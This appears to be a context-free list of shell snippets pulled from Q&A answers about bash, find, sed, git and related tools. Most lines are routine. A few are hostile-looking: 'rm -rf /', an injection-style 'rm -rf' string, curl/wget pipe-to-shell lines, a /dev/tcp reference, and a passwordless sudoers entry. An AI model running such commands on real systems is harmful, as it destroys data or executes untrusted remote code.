echo ....
printf "%s\n"
print -- ""
exit 0
exit 1
find . -name "*.xml" | xargs grep FOO
find . -name "*.xml" | xargs -i -sh -c "grep FOO {}"
-I {}
head | tee
eval $COMMAND
set -e
set -e; foo() { false; echo should not print; } ; foo && echo ok
set -e
[  OK  ]
[ ... -ne
set -e
echo $var | xxd -r | dd
man bash
 #!/usr/bin/env rvm 1.9.3@mygemset do ruby
ssh $cluster "mkdir $serialized/$number"
/data/.../create.bash 1 2 8
bash.exe --login -i
bash.exe --login -i
bash.exe --login --rcfile 01.txt -i
/Users/alice /Users/bob /Users/charles
git stash pop
git ls-files --others --exclude-standard
git ls-files
kill -s 0 $pid
wait $pid
tail -f /dev/null --pid $PID
kill -0 $pid
ps --pid $pid &>/dev/null
".*/[.] .*"
rename ". " "" filename
sudo somescript.sh
trap SIGUSR2
read some_variable\?pause
read \?"I am waiting for you to press [Enter] before I continue."
man zshbuiltins
man zshmisc
man test
[ $# > 0
test $# > 0
test $#
set -x
#!/bin/bash -x
echo "PID: $$, value of \$test: $test" > /tmp/script.out
cx ./foo
chmod a+x ./foo
ll ./foo
ls -l ./foo
shopt -s expand_aliases
hdiutil mount
hdiutil detach
hdiutil detach disk1s2
The second line
The third line
The fourth line
man bash
<( ... )
>( ... )
curl ...
sh ./script.sh
echo $ENV
grep -E
COUNT=ls | wc -l
info coreutils "tee invocation"
#! /bin/sh
source /etc/profile
curl -o - http://www.example.com/text.txt | grep "something"
-o -
chmod +x
ruby ./bash_test.rb
declare sd$i=true
export sd$i=true
config status
config checkout
config commit
#!/bin/bash -x
my_array=(1 2 3 4) ; printf '%s\n' "${my_array[@]}" | parallel -j 2 "echo {} &"
find *tif  -printf "%f\n"
nohup sh -c 'find *tif  -printf "%f\n" | parallel -j 2 echo {}' &
shopt -s expand_aliases
date -d datestring +format
printf -v newhour '%02d'
$(( ( 10#${f:0:2} + 14 ) % 24 ))
export DISPLAY=:0.0
echo $PATH
echo /bin/* /usr/bin/*
sort -k2M -k3n -k4
sort -s -k 2M -k 3n -k 4,4
"/bin/kill -- -$$"
HP Unix
INT KILL
AFTER calling f1
> /dev/null 2>&1
-regextype posix-extended
-mtime +3
CURRENT_DIR="/path/with\ spaces/backup"
CURRENT_DIR="/path/with\\ spaces/backup"
command "some thing"
some thing
eval command "some thing"
some thing
command some thing
command "some thing"
single token
extra argument '-'
[ ]
[[ ]]
(( ))
. runner.sh
cut -d" " -f 4
sed -e 's/^.* //'
exec -rm
-exec rm
{print $0}
NR == FNR
!= */
&& aOutputFolder+=/
openssl x509
'dir -d *'
$(dir -d *)
'dir -d *'
dir -d
Enter password
confirm password
MAC Address
/MAC Address/{
s/.*(\(.*\)) .*MAC Address: \(.*\) .*/\1 -> \2/
s/^Host .*is up/& but MAC Address cannot be found/
(( ))
wc -l
ask_password = on/off
comm -32 <(ls -la dir-1)
<(ls -la dir-2)
[[ ... ]]
[ ... ]
test ...
cd ./
sub1.txt, sub2.txt,..., sub100.txt
all1.txt, all2.txt,..., all100.txt
help read
mysql -u root -p'${mysqlrp}'
mysql --password=[password]
TCON (Content type): Jazz (8)
find $the_dir -printf '%P\n' > somewhere
uniq -u
ls -l
<span class='i'> </span>
<i> </i>
< / span>
perl -p
span class='i'
stdbuf -oL grep
tail -f
cat -v
cat -v
dd bs=1 count=1 status=none | cat -v
stty --save
pbt asadmin [start-domain|stop-domain]
pbt deploy [all|current]
bind 'set show-all-if-ambiguous on'
> file.txt
tar -czf
./script.sh file
./script.sh file
grep foo file | ./script.sh
y=a; echo ${x#$y/}
man expr
expr "foo/bar/baz" : '[^/]*/\(.*\)'
chmod +x
. ./myscript.sh
mv *20010209*
mv -i
[08/Mar/2011:00:26:35 +0530]
git diff
rev-parse --verify
Good Block
egrep '^myunknownstring'
$(date +%Y%m%d-%H%M%S).txt
mkdir -p 3dvideos_packetcapture
chmod -R 655 3dvideos_packetcapture
vim ~/.bashrc
source ~/.bashrc
set_title newtab
PROMPT_COMMAND='echo -en "\033]0; $("pwd") \a"'
if [ ]
if (( ))
(( var++ )).
rhythmbox-client --print-playing
-B0 -A999999999
tput rep
jot -s "/" -b "\\" $((COLUMNS/2))
-f "#"
-s ''
-v varname
printf '%*s' 42
${var// /$pattern}
repecho 7 b
perl -E 'say "=" x 100'
${var// /=}
${foo// /=}
(( i= 0; ... ))
testrepeat 100 1000
testrepeat 1000000 1000
perl -E 'say "=" x 100'
printf '\n'
printf '=\e[80b\n'
fully POSIX-complaint
loop-less (in fact, doesn't even have to spend time calculating the desired length unless you wanna customize it)
non-awk-variant specific
ASCII punctuation
euler e^pi
100 million
python ( * )
perl ( x )
it's as dangerous as it is efficacious :
echo -n START; rvm use 1.8.7 ; rvm list; echo -n END
. ./script.sh
. ./script.sh
(Allele1...Forward & Allele2...Forward)
form action="script.sh"
line="##element"; echo "${line#??},"
grep "ERR" log_and_error_msg.txt
sed 's/^/TYPE /'
while read
echo "$fileName" | sed 's/\..*$//g'
od -c
echo pwd
man bash
gnome-terminal --tab --working-directory="$FOLDER"
if [ ! "$(pgrep vlc)" ]; then echo not running; else echo running; fi
export CDPATH=/dir/customers
cd David_Johnson
grep -E
dos2unix scriptname
for i in {1234..1350}
s/ /\//g
mkdir -p $path
mkdir -p shared/projects/movies/action
mkdir -p $dir
$ eval "mkdir -p tmpdir/{trunk/sources/{${DOMAIN_NAME}},branches,tags}"
$ echo This is wrong | bash client.sh
This is correct
ls /proc/$$/fd/
printf ""
export PS1='${RESET}...'
set -x
0302 0240
"john is 17 years old"
" \t\n"
re.split(r'\W+', str)
bash for
/pattern1/ && /pattern2/
awk '/PATT1|PATT2/ { print }'
rename 's/\.a$/.a.b/' <files>
sftp --password="password" "userid"@"servername"
sftp -h
chmod +x test_script.sh
sudo apt-get install sshpass
sshpass -p '#Password_For_remote_machine' scp /home/ubuntu/latest_build/abc.war #user@#RemoteIP:/var/lib/tomcat7/webapps
sudo apt install sshpass
cat abc.txt | grep "hello"
echo $lines
echo "$lines"
"bbb ccc"
(date; ps $PPID) >> /your/call.log
dialog --menu
dialog --menu
< <( ... )
<( ... )
$( cmd )
s/^.*$/"&" ""/
echo -e
echo -e "$result"
mv old.txt new.txt
mv: cannot stat ``test1.txt': No such file or directory
# m h  dom mon dow   command
0 * * * * /home/beekguk/scripts/test.sh 2>&1 >> /home/beekguk/logs/test.log
0 * * * * /home/beekguk/scripts/test.sh >> /home/beekguk/logs/test.log 2>&1
echo $$
git status
git status -s
git config core.excludesfile
> .gitignore
git status
screen -dmS name stuff_to_execute
-d -m
screen -S name -X quit
screen -dS name
tr : \\n
sed 's#$#blabla#g'
line 2: .//home/a/toUpperCase: does not exist
[ -v name ]
cat /proc/mdstat
sudo grub-install /dev/sd*
set -u
jobs -p
| uniq
A 100
A 100
man printf.1
man dash
wine /path/to/file.exe
wineThis /path/to/file.exe
rm $f
nginx -t
sed -n 'Xp' theFile
man grep
$HOME=(magic here)$HOME
wget -q -U Mozilla -O 1.txt $link
wget -q -U Mozilla -O 1.txt "$link"
exec('/your/command /dev/null 2>/dev/null &');
gconftool-2 --shutdown
gconftool-2 --spawn
ls -l /dev/fd/
$( )
$( )
$( )
sh -c 'cmd'
sort input_file >output_file
man rename
chmod +x
bash reset_db.sh
set -x
function myfun(){ ... return 0; else return 1; fi;}
function myfun(){ ... return; else false; fi;}
0 = true
1 = false
return 1
return 1
return 255
if [ myfunc ]; then ...
if myfunc; then ...
if [ x -eq 1 ]; then...
return $(true)
return $(false)
true; return
(true; echo $?)
(exit $rval)
if (($rval))
if [ $rval ]
> /dev/null
./script file1.html
echo -e "USE db\nGO\nINSERT INTO db_table (id, data, meta)\nVALUES (1, 'data', 'meta')\nGO\nexit" > tempfile
cat tempfile - | tsql -H 10.10.10.10 -p 1433 -U user -P pass
cat tempfile -
sysctl -a
bundle exec thin start
exec $SHELL -s ...
exec $SHELL -s ... -I
rm -rf /;
-n 10
echo -n
diff -u $i /tmp/b/${i#/tmp/a/} > /tmp/patch/$j.patch
-p <num>
test x
. script-two.sh
[: 10#0910: integer expression expected
man bash
fc -ln
type type
type is a shell builtin
["bash", "-c", "type", "type"]
diskutil info disk0s2 | grep -Ei 'Total.+([0-9]){10,}' | grep -Eio '[0-9]{10,}'
127.2 GigbaGytes
127.000.000.000 bytes
diskutil info disk0 | grep -Ei 'Total.+([0-9]){10,}' | grep -Eio '[0-9]{10,}'
source .bash_profile
alias [name]="[script]"
watch -n ${INTERVAL} 'python ${SCRIPT}'
watch 'date; echo; echo Long running task...; sleep 3; echo; date'
parse error. not well formed
a[$1]=$2 FS $3
$2 FS $3
{print $0, a[$1]}
TEST : TEST
TEST : /file/path
cool1.txt,cool2.txt,..., cool100.txt and warm1.txt, warm2.txt,...,warm100.txt.
coolwarm1.txt ,coolwarm2.txt,coolwarm100.txt
awk '{print FILENAME, $0}' cool1.txt warm1.txt > coolwarm1.txt
rm -rf \; echo 'gotcha!'
"$1" | cut -d'.' -f1".jpg"
for filename in "$@"
set -C
set -o noclobber
set +C
0d 0a
find -type f -name "*.htm" | <some goblygook here>
<some goblygook here>
cp ./General/1997/05/970525-002.htm ./flat/General-1997-05-25-002.htm
find -type f -name "*.htm" | sed 's@^./@@g;s@/@-@g' | awk -F'-' '{print $1 "-" $2 "-" $3 "-" substr($4, 5, 2) "-" $5}'
tail -F
-maxdepth 1
xargs -0
tail -f a.txt
stdbuf -oL command > output
stdbuf -o0 command > output
nohup my-daemon &
my-daemon &
"bar fizzle"
sort -z
cd ..
cd apps/models && mv keywords_builder.rb keywords_generator.rb && cd -
mv -iv {,old_}readme.txt # 'readme.txt' -> 'old_readme.txt'
mv -iv file{,.backup}    # 'file' -> 'file.backup'
mv -iv "system file" !#$.backup # 'system file' -> 'system file.backup'
mv -iv "file with a long name" !#$:p
sudo /etc/init.d/apache2 reload
curl -s --get --data-urlencode "q=example" http://ajax.googleapis.com/ajax/services/search/web?v=1.0 | sed 's/"unescapedUrl":"\([^"]*\).*/\1/;s/.*GwebSearch",//'
googler -n 1 -c in -l en search something here --json
chmod +x myscript.php
php myscript.php
which -a php
php is /usr/local/php5/bin/php
php is /usr/bin/php
php is /usr/local/bin/php
php is /Library/WebServer/CGI-Executables/php
php-cgi -v
npm install glob
#define BRANCH @"your current branch"
sed 's/\.0\{1,2\}/\./g' | sed 's/^0\{1,2\}//'
ls -l filename
ls -l <filename>
stat file
$ printf '%x\n' $(seq 1048575 1024 1050623)
range(0xA000, 0xA0FF + 1)
+ 1
range(0xA000, 0xA0FF)
function($n) { return sprintf("%04X", $n) }
implode(';', )
git config -l
ls -t | head -3
ls -t | head -3 | scp *username*@*address*:*path*
find -type f
head -3
if($i ~ "^[0-9A-F]+$")
$i=sprintf("%c", strtonum("0x"$i))
%d-%m-%Y %H:%M
f(char) for char in text
while IFS= read -r -n1 c;
if [[ "$c" == '"' ]];
elif [[ "$c" == $'\0' ]];
elif ((flag))
printf "<U%04X>" "'$c"
else printf "%c" "$c"
echo -n "aä" | ruby -KU -e '$<.chars{|c| print "<U"+"%04X"%c.unpack("U*")[0]+">"}; puts'
$KCODE = "U"
declare -a
sh -c "...
sed -n
sort -m
$(($HISTCMD % 30))
PS1="\e[0;${a}m$ \e[m"
man bash(1)
workon `cat .venv`
source bin/activate
bash: [y=y]: command not found
DIR=$1; cd $DIR
kill -l
kill -0 <PID>
./myrun 1
./myrun 2
(( $i % 10 == 0 )) && wait
((i=i%N)); ((i++==0)) && wait
hostname -i
#!<interpreter> <arguments>
<interpreter> <arguments>
docker exec
#!/usr/bin/env python3
php -v
php yourfile.php
php -r 'print("Hello world");'
chmod +x filename.php
php -f /path/to/phpfile.php
gsettings set org.gnome.desktop.background picture-uri file:///path/to/img.jpg
stat --printf=%Y dirname
durep [OPTION]… [DIRECTORY]
du - s *
echo "${var}x"
echo "$varx"
(echo "Hi" ; echo "Bye") | sed -e "s/Hi/Hello/"
$(expr 1 + 1)
$((5 * 4 / 3 + 2 % 1))
import os
man find
man xargs
man ls
xargs rm ls -ld
xargs rm
find . -type f -size 0 | xargs rm
(' \ /bin/bash: -c: line 0: 
/opt/ibm/db2/V9.7/bin/db2 force application (1995)
$SHELL -c
sudo sh -c
sudo -s
set -f
read line
IFS= read -r line
echo -e
db2 connect to ttt
db2 UPDATE CONTACT SET EMAIL_ADDRESS = 'mytestaccount@gmail.com'
SQL1024N  A database connection does not exist.  SQLSTATE=08003
sudo -u db2inst1 id
sudo sh -c 'whoami; whoami'
sudo -s
man ssh
( )
declare -p
declare -p
read -a myarray
read -a
bash -c "..."
declare -p ${!myprefix*}
export -f
set +a
() { functionbody }
() {
declare -f
#if 0
#if ARRAY_EXPORT
declare -a
declare -g
declare -ga
declare -A
declare -Ag
declare -a name[0]
declare -a
declare -p
-d ...
script -f -c
script -c <command> <logfile>
declare -p
BASH_ENV=<( declare -a _=("" "$@") && declare -p _ ) bash -c 'set -- "${_[@]:1}" && echo "$@"'
SHELL=/bin/bash BASH_ENV=<( declare -a _=("" "$@") && declare -p _ && echo 'set -- "${_[@]:1}"') script -f -c 'echo "$@"' /tmp/logfile
in_pty=bash -c 'SHELL=/bin/bash BASH_ENV=<( declare -a _=("" "$$@") && declare -p _ && echo '"'"'set -- "$${_[@]:1}"'"'"') script -qfc '"'"'"$$@"'"'"' /tmp/logfile' --
$(in_pty) test --verbose $@ $^
cygwin bash 3.2.48
Linux bash 4.3.48
"bash serialize array"
"svn: '.' is not a working copy"
dirs=find $SOURCE -type d -links 2
ulimit -p 0
>> traffic.txt
complete «options» «command»
complete -u su
-F function
xargs rm
sudo /dir/dir/myScript.sh start
/dir/dir/myScript.sh start
cat -v
git diff --color src/Strmrs.h| grep $'^\(\x1b\[[0-9]\{1,2\}m\)\{0,1\}+'
git status
couldn't read file "line": no such file or directory
sqlite3 db "SELECT prkey FROM printers"
> file
(32767 - $FLOOR)
$RANDOM * ( 32767 - $FLOOR ) / 32767 + $FLOOR
cp file.txt test1.txt
xcopy *.txt *.bak
xcopy *.txt *.bak
xcopy <list of files ending with .txt> <list of files ending with .back>
xcopy file1.txt file2.txt file3.txt file4.txt old.bak
48, 00, 49, 00
#! /bin/bash
man bash
man sed
sed '/pattern/d' FILE > FILE
find . -name '[!.]*'
find . -name '[!.]*' -print0 | sed 's/Namespace/Test/gI' | xargs -i -0 echo '{}'
-print -exec sed -i 's/Namespace/Test/gI' {} \;
find printf
sed -z -e
:;recursive regex test;t
rm -rf ${UNNECESSARY}
\( -path PATTERN -exec rm -rf \{\} \)
_mvnfind "${@}"
mv -n $1 $2
read -R SED <<HEREDOC
find . -name ${OLD} -printf
%dir-depth :tab: 'mv '%path-to-${SRC}' '${sed_sep}'%path-again :null delimiter:'
sort -general-numerical -zero-delimited
sed -ex :rcrs;srch|(save${sep}*til)${OLD}|\saved${SUBSTNEW}|;til ${OLD=0}
sed -ex...-ex search|%dir_depth(save*)${sed_sep}|(only_saved)|out
log_user 0
SHELL = /bin/bash
"/< php ?  >/"
cp -p $NM_cfg/*.cfg ${altM_cfg}
alias CP='/bin/cp -pi'
/bin/ls -ltr
echo $filename
"name1:value1, ... name2:value2, ... name3:value3, ..."
"name1:value1, ... name2:value2, ... name3:value3, ..."
d = eval('{'+"name1:value1, ... name2:value2, ... name3:value3, ..."+'}'
cat input.txt |
An-Beat - Mentally Insine (Original Mix).mp3
An-Beat\ -\ Mentally\ Insine\ \(Original\ Mix\).mp3
test dir
test dir
ssh -t -t
declare -p
awk '{printf "%s[%s]\n", $1, $3}' "input.txt"
printf "%s[%s]\n", $1, $3
which tclsh
head -$matchNumber | tail -1
sed -n ${matchNumber}{p;q}
A1 > tmpfile
exec > **${spaceChar}** >( .... ) 2>&1
>( ... )
grep -F -i -n -f <file_containing_pattern> <file_containing_data_blob>
bash test1.sh
sh test1.sh
syntax error: '(' unexpected
for ((x;y;z))
set -xv
for varname in list
for (( expr1; expr2; expr3 ))
for c in $(seq 1 5)
sh ./test1.sh
cat -
ls -b
-regextype posix-egrep
./foo bar
./foo bar/baz
-exec rm {} ;
git log
git rev-list
git notes
echo "Test\n"
echo "Test\n" | grep '\n'
echo "Test\n" | grep '\\n'
while (cond) ; do {block} done
echo The sum is $((number1+number2))
echo $PATH
cd .
cd /some/other/repo
color index red black ERROR
df -k
df -Pk
chmod -w
man grep
grep -E
grep -e
bash -x script.sh
expect EOF
date -d "20110405 -3 days" "+%Y%m%d"
date -d "last friday" "+%Y%m%d"
date -d "20110405 last friday" "+%Y%m%d"
date -d "20110405 -2 days -$(date -d '20110405' '+%w') days" "+%Y%m%d"
for i in $(find|grep .txt); do grep "search" "$i";
grep --help
set +x
set -v
man 1 env
export a=1
hostname --ip-address
hostname --ip-address
hostname --ip-address
function hostname(){ echo -n; }
sed -E
sed -r
[tar location]/var/file.txt
[tar location]/usr/file.txt
var/file.txt -> /usr/file.txt
www-data   ALL=NOPASSWD: /var/private-www/bin/webadmin
exec('/usr/bin/sudo /var/private-www/bin/webadmin secretpassword', $output, $status);
echo $("123" | rev)
crypt_pass "a"
crypt_pass "b"
eval `cat foo.sh`
eval #!/bin/bash echo foo
cat foo.sh | ssh -T root@remote
while read
-not -name
screen -t 'errors' tail -F current.log | grep -A 3 "ERROR"
bash -c
help getopts
C-x C-s
~/Library/Application Support
set -o emacs
set -o vi
sed -E
gnu sed
echo mv
around x
eval $(declare -F "$1")
_deep inside_
b.bmp c.bmp
9.8.0 Darwin Kernel Version 9.8.0
python test.py test.txt
tail -f test.txt
$ echo 'ee' | foo
$ echo 'ee' | tee output.txt | foo
$ echo 'ee' | tee /dev/stdout | foo
% ls [A-J]* | tee /dev/tty | wc -l
% alias t tee /dev/tty
% alias wcl wc -l
% ls [A-J]* | t | wcl
source common.sh
curl -h "Host:localhost" localhost
bind '"\e[[E": "/home/yourscript.sh\n"'
if (NF > 4 && length($0) > 14)
export PROMPT_DIRTRIM=2
$(pwd | tail -c16)
$1, $2 ...
$((    ))
$((  ))
echo $((11/10))
echo $((19/10))
id++ id--
++id --id
- +
! ~
* / %
+ -
<< >>
<= >= < >
== !=
expr ? expr : expr
= *= /= %= += -= <<= >>= &= ^= |=
expr1 , expr2
printf "0x%X\n" number
ruby myscript.rb
echo $[{1..10}*{1..10}] | xargs -n10 | column -t
boundary=4; eval echo $\[{1..$boundary}*{1..$boundary}\] | xargs -n$boundary | column -t
boundary=4; eval eval echo "$\(\({1..$boundary}*{1..$boundary}\)\)" | xargs -n$boundary | column -t
{0..2}' and calls 
./A |./B
./B |./A
echo $((($x+$y)**3))
System Events.app
Parameter expansion
echo "${malkovich-}"
echo "${1-}"
set -u
set -u
set -o nounset
while read -r line ... < FILE
eval eval echo "\$\(\("{1..$boundary}*{1..$boundary}"\)\)"
eval eval echo \\\$\\\(\\\({1..$boundary}*{1..$boundary}\\\)\\\)
gcc myProgram
make all
heroku console --remote staging
heroku console --remote production
google youtube post --access unlisted --category Tech $f
> /dev/null
The command ... outputs a string
series | of | commands
du -b
man bash
bar quux xyz
cat file | perl -p -i -e 'undef $_ if /^\*\*/ .. /==$/'
cat file | sed -e '/^\*\*/,/==$/d'
cat return_input.c
bash task.sh
echo "$var"
rm -f
del /f
cd ..
cd ..
grep -E
hg update
echo $?
hg update
kill $foo_pid >/dev/null 2>&1
sh -c 'cmd &'
set +m
rsync -avz -e ssh -c blowfish source user@remote:dest/
"$1" "$2" "$3" ...
"$1 $2 $3 ..."
$1 $2 $3 ...
tr -d '\n'
./myColumDump -j 2
-j .*monday
<new value>
in_env && $2 == prop
property : value
$1 : $2
$2 == prop
files=(*) ; echo "${#files[@]} items"
inputStr is null
6141 000a
echo -n
hexdump -C
od -t x1
od -t x1c
xxd -r
xxd -p
xxd -r -p
tr -d '\n'
sh --version
info bash
sh scriptname
bash scriptname
chmod a+x scriptname
<<<'here strings'
2>&1 |
> ... 2>&1
type -a
printf -v
echo -e
/dev/tcp/<network address>
export variable=value
[ "x" == "y" ]
export variable
[ ... ]
sh scriptname
Bourne shell
Bourne *again* shell
./findWordBoundary.sh <input args> |& tee run.log
x=./findWordBoundary.sh <input args>
404:Not found exception
echo $?
... | xargs bash -c '...'
echo "php /run/this/script.php" | at 18:43
echo <(cat /dev/null)
sh -c "$(curl -fsSL <URL>)"
${SHELL:-sh} -c "$(wget -qO - http://mywebsite.example/myscript.txt)"
${SHELL:-sh} -c "$(curl -Ls http://mywebsite.example/myscript.txt)"
while [ $temp == 1] {
-U --force
|| :
|| :
command || /bin/true
sed -k 's\@<....@@g' *.php
javac: file not found: path/to/dir/*.java
javac @foo
printf "%q" "$file"
while read file
printf "%q"
OLD_IFS=IFS; IFS=$'\n'
... | xargs bash -c '...'
user1 user2
[[ -z $IPADDY ]] && continue
which telnet
ls -l /bin/sh
MUDFLAP_OPTIONS="-help" ./myexecutablefile
cd $a
-bash: cd: ~/Foo: No such file or directory
cd ~/Foo
cd $a
$(( ))
echo $((1 + 2))
$(( ... ))
28 = 28
$(( ))
bash -l
./my-command --params
bash Shell Debugger, release 4.0-0.4
bash -x myscript
set -x
set -x
nohup [ options ] command [arg ...]
read -t0.1
stty sane
tail -n 1
set -e
set -e
readlink -f
abspath ${0}
foo->dir1/dir2/bar bar->./../doe doe->script
})(); (new line)</script>
} catch(err) {}</script>
})(); (new line)</script>
} catch(err) {}</script>
cat /tmp/data | tr "\n" "@" | sed -e 's/<div>[^<]*some text here[^<]*<\/div>//g' | tr "@" "\n"
some text here
tput lines
tput cols
man perlfaq8
sed 's@^@     @' <(f1)
f1 > >(sed 's@^@     @')
sed 's@^@     @' <(f1)
awk '{print NF}' file | sort -nu | tail -n 1
head -n 1
tail -n 1
cat file | wc -l
wc -l < file
$(wc -l "$file")
$(wc -lL "$file")
head -n1
grep -o
wc -l
perl -ane '$maxc = $#F if $#F > $maxc; END{$maxc++; print "max columns: $maxc\nrows: $.\n"}' file
perl -F, -ane '$maxc = $#F if $#F > $maxc; END{$maxc++; print "max columns: $maxc\nrows: $.\n"}' file
awk -F'\t' '{print NF; exit}' myBigFile.tsv
wc -l file
head -1 file | tr ";" "\n" | wc -l
head -1 file
| tr ";" "\n"
wc -l
colorscheme desert
set -x
man test
-h file
rsync -e ssh
-o BatchMode=yes
echo ${newvar:=somevalue}
find 2006-06* -type f -iname "*.jpg"
UPDATE table SET field = REPLACE(field, '_', '');
./test.py &> logfile.log & PID=$!
sudo service productcrawler-router start
dpkg -i
dpkg --info
dpkg --info
dpkg -i
declare -x
declare -x FOO
export FOO
declare -x
declare -gx NAME=X
export NAME=X
declare -x
ls -l
od -c
-e 's/^  *//g'
-e 's/^[[:space:]]\{1,\}//'
-e 's/<td>//g' -e 's:</td>::g'
-e 's|</\{0,1\}td>||g'
&> log.txt
cat log.txt > log.txt.1
kill -INT <pid>
kill 888
stty -a
kill -INT <pid>
kill -INT <pid>
$(__git_ps1 "[%s]")
Mr. James
find: .: Permission denied
sudo find /dev -maxdepth 1 -type f
-type -f
cd /dev
cd /
cd -- "$PWD"
cd -
cd /tmp
ERROR: Gemset 'testing' does not exist, rvm gemset create 'testing' first.
rvm info
rvm info
info sed
chmod +x
find -exec cat {} + | wc -l
find -exec wc -l {} +
sed -i '1s/^/Text
file\n/' /file/to/change
rename '' string_ *
awk $8
find /path/to/dir -newer touched.file
ls  -ltr --time-style=long-iso <path> | awk '$6 >= "2018-10-10" {print $6,$8}'
Bad for looping
xrandr --prop
man perlop
perl -e '$bar = qx/pwd/;'
xml ed -u ’/xml/table/rec[@id=3]/@id’ -v 5 xml/tab-obj.xml
IDENTIFIED BY
chmod +x script
sudo su
su -c
s chown matt file\ with\ spaces
printf "%q " "$@"
printf "%q " "chown" "matt" "file with spaces"
sudo su -c "chown matt file\ with\ spaces "
chown matt file\ with\ spaces
"foo bar"
foo\ bar
"$1 $2 $3"
"$1" "$2" "$3"
sudo -s
set -e
$? -eq 0
[[ $? -eq 0 ]] return
set -e
trap <expression> CHLD
trap <expression> SIGCHLD
tee -ai /tmp/garbage.txt
kill -QUIT 62889
signal caught in child
ps -j
tee -ai ...
-newer ... -a ! -newer ...
comm <(sort a) <(sort b) -3
git fetch
/Program Files
/Program\ Files
export GIT_SSH=/c/Program\ Files/TortoiseGit/bin/TortoisePlink.exe
/c/Program\ Files/TortoiseGit/bin/TortoisePlink.exe
export env.SOMETHING=/Users/Me/repo/main/ver
-bash: export: 'env.SOMETHING=/Users/Me/repo/main/ver': not a valid identifier
qmake -v
ls | scriptname
ls < scriptname
chmod +x scriptname
select into outfile
tail -F myFile.avi
ssh -f user@vps -L 2000:localhost:3306
alias phpr="php -r"
"$1" "$2" …
5 first-arg
5 first-arg
env :PATH, "..."
bash -l
which ruby
echo $PATH
Syntax error: EOF in backquote substitution
sudo mount
s/\\plain .*}}/ /g
[ -z "$PROJECT_NAME" ]
man test
123 456 abc. cat and mouse
$ python py4sa
for f in *.{png,tif,gif,bmp}; do
ulimit -c unlimited
chmod 777
eval echo \${$VAR1${PWD////_}}
git status
C:\Program Files\Git\bin
git status
git status
echo $PS1
C:\Program Files\Git\etc\profile
. /etc/bash_completion
Process Substitution
ls *.jpg | parallel convert -geometry 120 {} thumb_{}
ls: cannot access file[success].mpg*: No such file or directory
printf %q
ls $others"*"
$> curl "http://images.google.com/images?q=apple"
unicodedata.normalize('NFKC', thestring)
table[0x3000] = u' '
printf '\r'
tput cuu1;tput el
printf '\e[A\e[K'
erase_lines 5
$( ...)
BASH 3.2.39(1)
mmv \*.jpg \#1.jpeg
find . -size +2500k -exec rename -s .jpg .jpeg '{}' ';'
sudo su -
sudo ./script.sh
grel -l
xargs gzcat
while read f; do ... ; done < $FILES
./mountpoint.sh <file>
for f in *.jpg; do ./autocolor.sh $f; done
echo $countPwd
ls -l
ls -l
exec 4<&1
bash --posix
mv *run*.html dir1
echo m
mv *.mp3 1-*.mp3
man rename
head -1
ls -t
head -1
find . -maxdepth 1 -name "my-pattern" -print0
ls -1 -t
-printf '%T+ %p\n'
ls -t | head -1
head -1
echo ${?}
./nv0914 < nv0914.challenge
echo ${?}
${i// /\\ }
echo -n
tail -f
scriptname.sh | whatever_commands_here
nohup scriptname.sh | whatever_commands &
there is no place like home\n
git branch --edit-description [branch_name]
git init
PROJECT-2313: Add awesome feature
sed -i '.bak'
git branch --show-current
git commit
git commit -m …
ABC #123: 
22/08/2007 01:00
find /myDir -mindepth 1 -mtime 7 -delete
find /myDir -mindepth 1 -mtime +7 -delete
mtime +6
man bash
... {} ";"
head -1
while read f; do rm -rf ${f}; done < movies-to-delete.txt
/foo12323/test34 - 343bar/test - 234/test - 4323.txt
help [[
sort -u
sort -V
-t .
curl -O "http://media.pragprog.com/titles/rails4/code/depot_b/public/images/*.jpg"
print ORS
$(basename $FOO)
eval echo '${'"$(basename $FOO)"':0:1}'
wc -m
l=$0; gsub(/\047/, "\047\"\047\"\047", l);
cmd=sprintf("echo \047%s\047 | wc -m", l);
wc -m
cmd | getline c;
sub(/ */, "", c);
{ print c, $0 }
| sort -ns
| cut -d" " -f2-
SELECT INTO OUTFILE
mysql --batch --raw
sudo su
man sudoers
sh screenshot
sh /usr/bin/screenshot
[ -n file.txt ]
[ -s file.txt ]
wc -c
du -k
stat -c '%s' file.txt
stat -f '%z' file.txt
cut -d' ' -f1
wc -c
awk '{print $1}'
if [ $size -lt $your_wanted_size ]; then
du --threshold=
PAGER='"C:\Program Files\Git\usr\bin\less.exe"'
--LONG-PROMPT --no-init --quit-if-one-screen --RAW-CONTROL-CHARS
Windows 7 (64-bit) and Git-Bash: GNU bash, version 3.1.23(6)-release (i686-pc-msys)
tail -c 1
$(tail -c 1 <file)
-type f
directory already exists
`./virtmem 100 $c fifo sort2 >> results/FIFOSORT.txt
./virtmem 100 $c "fifo" "sort2" >> results/FIFOSORT.txt
./script | less
less +G
browsefolders ()
sh -n scriptname
 
man tr
string="Hello World" ; echo "${string// /.}"
output: Hello.World
( ps -o pid,ppid,cmd )
( echo hello ; ps -o pid,ppid,cmd )
( echo hello ; ps -o pid,ppid,cmd )
echo '&#33;' | w3m -dump -T text/html
printf "\u00A7\n"
env printf
./html_unescape.sh foo.html
[ ... for l in sys.stdin]
from html import unescape
cp -r
rsync -hxDPavilyzH --stats --delete
tail -r
/pattern/,$d' works on the last line but the
tail -n+1
= getenv("VAR");
echo lala.txt |  php -r '$line = trim(fgets(STDIN))if(is_file($line)){echo "1";}else{echo "0";}'
p close(0)
disown -a
(stdoutdata, stderrdata)
git symbolic-ref HEAD
PS1="[\D{%Y-%m-%d} \t] \u@\h:\w\a \${?##0} \$ "
trap ... ERR
trap 'echo You have new mail.' ERR
%(?,, -%?-)
PS1='${?#0}> '
PS1="\${?#0}> "
echo $PS1
man 1 tput
man 5 terminfo
Ctrl + r
\033[32mThis is in green\033[0m
\[\033[32m\]This is in green\[\033[m\]
for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done
ls | pcc
df | pcc
system( "clear" )
echo -E
div {padding:1rem;font-size:larger}
$(c <flags>)
echo -e
bash -x test.sh | grep -v '+ echo'
-d -m
echo 2 | sudo alternatives --config java
/central\.database =/
central.database =
= .*
NEW VALUE
./script.sh "conf_file" "var_to_replace" "NEW VALUE"
touch /tmp/x
vim "$(!!)"
find . -name foo.txt -print0 | xargs -0  -I{} mv {} /some/new/location/{}
find . -name foo.txt -print0
!! | xargs -0  -I{} mv {} /some/new/location/{}
man xargs
printf '%s\n'
cat <<<$grab
alias L="tmux capture-pane; tmux showb -b 0 | tail -n 3 | head -n 1"
shopt -s lastpipe
2>&1 | exit_tests ; [[ "${PIPESTATUS[0]}" == "0" ]] || error_msg
| catch
man bash
main( int argc, char* argv[])
main( int argc, char* argv[])
cat -n
source filename
set -m
There are stopped jobs
wait $PIDS
